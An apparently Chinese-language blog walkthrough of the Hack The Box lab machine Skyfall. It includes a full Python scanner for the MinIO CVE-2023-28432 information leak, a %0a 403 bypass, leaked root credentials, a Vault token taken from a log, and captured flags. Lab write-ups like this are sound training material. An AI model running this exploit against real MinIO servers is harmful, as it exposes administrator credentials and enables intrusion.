@@ -1,0 +1,355 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB: Skyfall | Lavande&#39;s Blog</title>
+  <meta name="author" content="Lavande">
+  
+  <meta name="description" content="nmap结果
+12345678910111213141516171819┌──(kali㉿kali)-[~/htb/Skyfall]└─$ nmap -sC -sV --min-rate 10000 10.10.11.254 -oN nmapStarting Nmap 7.92 ( https://nmap.org ) at 2024-02-06 22:07 ESTNmap scan report for 10.10.11.254 (10.10.11.254)Host is up (0.28s latency).Not shown: 873 filtered tcp ports (no-response), 125 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Skyfall - Introducing Sky Storage!|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.23 seconds
+
+
+找到一个demo按钮
+发现跳转到demo.skyfall.htb
+将其加入hosts文件后访问
+
+提示有默认登录guest，进行登录"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB: Skyfall"/>
+  <meta property="og:site_name" content="Lavande&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Lavande&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Lavande&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB: Skyfall</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><img src="/../images/image-20240210103259351.png" alt="image-20240210103259351"></p>
+<p>nmap结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/Skyfall]</span><br><span class="line">└─$ nmap -sC -sV --min-rate 10000 10.10.11.254 -oN nmap</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2024-02-06 22:07 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.254 (10.10.11.254)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 873 filtered tcp ports (no-response), 125 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)</span><br><span class="line">|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Skyfall - Introducing Sky Storage!</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 26.23 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240210110543035.png" alt="image-20240210110543035"></p>
+<p>找到一个demo按钮</p>
+<p>发现跳转到demo.skyfall.htb</p>
+<p>将其加入hosts文件后访问</p>
+<p><img src="/../images/image-20240210110702158.png" alt="image-20240210110702158"></p>
+<p>提示有默认登录guest，进行登录</p>
+<p><img src="/../images/image-20240210110730108.png" alt="image-20240210110730108"></p>
+<p>发现File有403限制，其他选项也存在403</p>
+<p><img src="/../images/image-20240210110807611.png" alt="image-20240210110807611"></p>
+<p><img src="/../images/image-20240210110900782.png" alt="image-20240210110900782"></p>
+<p>加入%0a绕过</p>
+<p><img src="/../images/image-20240210111839705.png" alt="image-20240210111839705"></p>
+<p><img src="/../images/image-20240210111819025.png" alt="image-20240210111819025"></p>
+<p><img src="/../images/image-20240210111948013.png" alt="image-20240210111948013"></p>
+<p>发现域名</p>
+<p><img src="/../images/image-20240210112017473.png" alt="image-20240210112017473"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster</span><br></pre></td></tr></table></figure>
+
+<p>将prd23-s3-backend.skyfall.htb加入hosts</p>
+<p><img src="/../images/image-20240210112504334.png" alt="image-20240210112504334"></p>
+<p>minio v2 CVE</p>
+<p><img src="/../images/image-20240210112623446.png" alt="image-20240210112623446"></p>
+<p>POC ：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MzzdToT/CVE-2023-28432">https://github.com/MzzdToT/CVE-2023-28432</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#app=&quot;minio&quot;</span></span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">url_list=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ua</span>():</span><br><span class="line">	first_num = random.randint(<span class="number">55</span>, <span class="number">62</span>)</span><br><span class="line">	third_num = random.randint(<span class="number">0</span>, <span class="number">3200</span>)</span><br><span class="line">	fourth_num = random.randint(<span class="number">0</span>, <span class="number">140</span>)</span><br><span class="line">	os_type = [</span><br><span class="line">		<span class="string">&#x27;(Windows NT 6.1; WOW64)&#x27;</span>, <span class="string">&#x27;(Windows NT 10.0; WOW64)&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27;</span></span><br><span class="line">	]</span><br><span class="line">	chrome_version = <span class="string">&#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(first_num, third_num, fourth_num)</span><br><span class="line"></span><br><span class="line">	ua = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;Mozilla/5.0&#x27;</span>, random.choice(os_type), <span class="string">&#x27;AppleWebKit/537.36&#x27;</span>,</span><br><span class="line">				   <span class="string">&#x27;(KHTML, like Gecko)&#x27;</span>, chrome_version, <span class="string">&#x27;Safari/537.36&#x27;</span>]</span><br><span class="line">				  )</span><br><span class="line">	<span class="keyword">return</span> ua</span><br><span class="line"></span><br><span class="line">proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wirte_targets</span>(<span class="params">vurl, filename</span>):</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(vurl + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#poc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">url</span>):</span><br><span class="line">	url=parse.urlparse(url)</span><br><span class="line">	hostname  = url.hostname</span><br><span class="line">	url=url.scheme + <span class="string">&#x27;://&#x27;</span> + url.netloc</span><br><span class="line">	vulnurl=url + <span class="string">&quot;/minio/bootstrap/v1/verify&quot;</span></span><br><span class="line">	headers = &#123;</span><br><span class="line">		<span class="string">&#x27;User-Agent&#x27;</span>: get_ua(),</span><br><span class="line">		<span class="string">&quot;host&quot;</span>:hostname,</span><br><span class="line">		<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	data=<span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		res = requests.post(vulnurl, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>, headers=headers,data=data ,timeout=<span class="number">5</span>)</span><br><span class="line">		<span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;MinioEn&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			<span class="comment"># print(res.text)</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;\033[32m[+]&#123;&#125; is vulnerable\033[0m&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">			wirte_targets(vulnurl,<span class="string">&quot;vuln.txt&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;\033[34m[-]&#123;&#125; not vulnerable.\033[0m&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;\033[34m[!]&#123;&#125; request false.\033[0m&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">url_list, pools=<span class="number">5</span></span>):</span><br><span class="line">	works = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">		<span class="comment"># works.append((func_params, None))</span></span><br><span class="line">		works.append(i)</span><br><span class="line">	<span class="comment"># print(works)</span></span><br><span class="line">	pool = threadpool.ThreadPool(pools)</span><br><span class="line">	reqs = threadpool.makeRequests(check_url, works)</span><br><span class="line">	[pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">	pool.wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	arg=ArgumentParser(description=<span class="string">&#x27;check_url By m2&#x27;</span>)</span><br><span class="line">	arg.add_argument(<span class="string">&quot;-u&quot;</span>,</span><br><span class="line">						<span class="string">&quot;--url&quot;</span>,</span><br><span class="line">						<span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:http://ip:port&quot;</span>)</span><br><span class="line">	arg.add_argument(<span class="string">&quot;-f&quot;</span>,</span><br><span class="line">						<span class="string">&quot;--file&quot;</span>,</span><br><span class="line">						<span class="built_in">help</span>=<span class="string">&quot;Target URL; Example:url.txt&quot;</span>)</span><br><span class="line">	args=arg.parse_args()</span><br><span class="line">	url=args.url</span><br><span class="line">	filename=args.file</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[+]任务开始.....&quot;</span>)</span><br><span class="line">	start=time()</span><br><span class="line">	<span class="keyword">if</span> url != <span class="literal">None</span> <span class="keyword">and</span> filename == <span class="literal">None</span>:</span><br><span class="line">		check_url(url)</span><br><span class="line">	<span class="keyword">elif</span> url == <span class="literal">None</span> <span class="keyword">and</span> filename != <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(filename):</span><br><span class="line">			i=i.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			url_list.append(i)</span><br><span class="line">		multithreading(url_list,<span class="number">10</span>)</span><br><span class="line">	end=time()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;任务完成,用时%ds.&#x27;</span> %(end-start))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240210114816844.png" alt="image-20240210114816844"></p>
+<p>Burp post :<a target="_blank" rel="noopener" href="http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify">http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify</a></p>
+<p><img src="/../images/image-20240210115034627.png" alt="image-20240210115034627"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;MinioEndpoints&quot;:[&#123;&quot;Legacy&quot;:false,&quot;SetCount&quot;:1,&quot;DrivesPerSet&quot;:4,&quot;Endpoints&quot;:[&#123;&quot;Scheme&quot;:&quot;http&quot;,&quot;Opaque&quot;:&quot;&quot;,&quot;User&quot;:null,&quot;Host&quot;:&quot;minio-node1:9000&quot;,&quot;Path&quot;:&quot;/data1&quot;,&quot;RawPath&quot;:&quot;&quot;,&quot;OmitHost&quot;:false,&quot;ForceQuery&quot;:false,&quot;RawQuery&quot;:&quot;&quot;,&quot;Fragment&quot;:&quot;&quot;,&quot;RawFragment&quot;:&quot;&quot;,&quot;IsLocal&quot;:true&#125;,&#123;&quot;Scheme&quot;:&quot;http&quot;,&quot;Opaque&quot;:&quot;&quot;,&quot;User&quot;:null,&quot;Host&quot;:&quot;minio-node2:9000&quot;,&quot;Path&quot;:&quot;/data1&quot;,&quot;RawPath&quot;:&quot;&quot;,&quot;OmitHost&quot;:false,&quot;ForceQuery&quot;:false,&quot;RawQuery&quot;:&quot;&quot;,&quot;Fragment&quot;:&quot;&quot;,&quot;RawFragment&quot;:&quot;&quot;,&quot;IsLocal&quot;:false&#125;,&#123;&quot;Scheme&quot;:&quot;http&quot;,&quot;Opaque&quot;:&quot;&quot;,&quot;User&quot;:null,&quot;Host&quot;:&quot;minio-node1:9000&quot;,&quot;Path&quot;:&quot;/data2&quot;,&quot;RawPath&quot;:&quot;&quot;,&quot;OmitHost&quot;:false,&quot;ForceQuery&quot;:false,&quot;RawQuery&quot;:&quot;&quot;,&quot;Fragment&quot;:&quot;&quot;,&quot;RawFragment&quot;:&quot;&quot;,&quot;IsLocal&quot;:true&#125;,&#123;&quot;Scheme&quot;:&quot;http&quot;,&quot;Opaque&quot;:&quot;&quot;,&quot;User&quot;:null,&quot;Host&quot;:&quot;minio-node2:9000&quot;,&quot;Path&quot;:&quot;/data2&quot;,&quot;RawPath&quot;:&quot;&quot;,&quot;OmitHost&quot;:false,&quot;ForceQuery&quot;:false,&quot;RawQuery&quot;:&quot;&quot;,&quot;Fragment&quot;:&quot;&quot;,&quot;RawFragment&quot;:&quot;&quot;,&quot;IsLocal&quot;:false&#125;],&quot;CmdLine&quot;:&quot;http://minio-node&#123;1...2&#125;/data&#123;1...2&#125;&quot;,&quot;Platform&quot;:&quot;OS: linux | Arch: amd64&quot;&#125;],&quot;MinioEnv&quot;:&#123;&quot;MINIO_ACCESS_KEY_FILE&quot;:&quot;access_key&quot;,&quot;MINIO_BROWSER&quot;:&quot;off&quot;,&quot;MINIO_CONFIG_ENV_FILE&quot;:&quot;config.env&quot;,&quot;MINIO_KMS_SECRET_KEY_FILE&quot;:&quot;kms_master_key&quot;,&quot;MINIO_PROMETHEUS_AUTH_TYPE&quot;:&quot;public&quot;,&quot;MINIO_ROOT_PASSWORD&quot;:&quot;GkpjkmiVmpFuL2d3oRx0&quot;,&quot;MINIO_ROOT_PASSWORD_FILE&quot;:&quot;secret_key&quot;,&quot;MINIO_ROOT_USER&quot;:&quot;5GrE1B2YGGyZzNHZaIww&quot;,&quot;MINIO_ROOT_USER_FILE&quot;:&quot;access_key&quot;,&quot;MINIO_SECRET_KEY_FILE&quot;:&quot;secret_key&quot;,&quot;MINIO_UPDATE&quot;:&quot;off&quot;,&quot;MINIO_UPDATE_MINISIGN_PUBKEY&quot;:&quot;RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;MINIO_ROOT_PASSWORD&quot;:&quot;GkpjkmiVmpFuL2d3oRx0&quot;</span><br><span class="line">&quot;MINIO_ROOT_USER&quot;:&quot;5GrE1B2YGGyZzNHZaIww&quot;</span><br></pre></td></tr></table></figure>
+
+<p>安装minIO</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://dl.min.io/client/mc/release/linux-amd64/mc \</span><br><span class="line">  --create-dirs \</span><br><span class="line">  -o $HOME/minio-binaries/mc</span><br><span class="line"></span><br><span class="line">chmod +x $HOME/minio-binaries/mc</span><br><span class="line">export PATH=$PATH:$HOME/minio-binaries/</span><br><span class="line"></span><br><span class="line">mc --help</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240210120426239.png" alt="image-20240210120426239"></p>
+<p>运行minIO客户端</p>
+<p><img src="/../images/image-20240210120731037.png" alt="image-20240210120731037"></p>
+<p><img src="/../images/image-20240210120907401.png" alt="image-20240210120907401"></p>
+<p>下载v2的gz备份文件</p>
+<p><img src="/../images/image-20240210121104334.png" alt="image-20240210121104334"></p>
+<p>解压</p>
+<p><img src="/../images/image-20240210121154687.png" alt="image-20240210121154687"></p>
+<p>bashrc中</p>
+<p><img src="/../images/image-20240210121443117.png" alt="image-20240210121443117"></p>
+<p><a target="_blank" rel="noopener" href="https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords?source=post_page-----73c18ca3aa91--------------------------------">https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords?source=post_page-----73c18ca3aa91--------------------------------</a></p>
+<p><img src="/../images/image-20240210121553082.png" alt="image-20240210121553082"></p>
+<p>安装vault后登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com <span class="subst">$(lsb_release -cs)</span> main&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/hashicorp.list</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install vault</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240210122625247.png" alt="image-20240210122625247"></p>
+<p>用OTP作为SSH密码登录</p>
+<p><img src="/../images/image-20240210122859486.png" alt="image-20240210122859486"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8cf6d662d3745b57874ee6a010c065c5</span><br></pre></td></tr></table></figure>
+
+<p>Root</p>
+<p><img src="/../images/image-20240210123044119.png" alt="image-20240210123044119"></p>
+<p><img src="/../images/image-20240210125353831.png" alt="image-20240210125353831"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">askyy@skyfall:~$ cat debug.log</span><br><span class="line">2024/02/10 04:51:48 Initializing logger...</span><br><span class="line">2024/02/10 04:51:48 Reading: /etc/vault-unseal.yaml</span><br><span class="line">2024/02/10 04:51:48 Security Risk!</span><br><span class="line">2024/02/10 04:51:48 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG</span><br><span class="line">2024/02/10 04:51:48 Found Vault node: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/02/10 04:51:48 Check interval: 5s</span><br><span class="line">2024/02/10 04:51:48 Max checks: 5</span><br><span class="line">2024/02/10 04:51:48 Establishing connection to Vault...</span><br><span class="line">2024/02/10 04:51:48 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb</span><br><span class="line">2024/02/10 04:51:48 Checking seal status</span><br><span class="line">2024/02/10 04:51:48 Vault sealed: false</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240210125549281.png" alt="image-20240210125549281"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a8ec5e81290ada100054ee70fa769a04</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240210125633351.png" alt="image-20240210125633351"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/02/03/HTB-Pov/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-02-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Machines/">Machines<span>8</span></a></li> <li><a href="/categories/Machines/Lab/">Lab<span>8</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/HTB/">HTB<span>10</span></a></li> <li><a href="/tags/season4/">season4<span>3</span></a></li> <li><a href="/tags/insane/">insane<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 Lavande's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
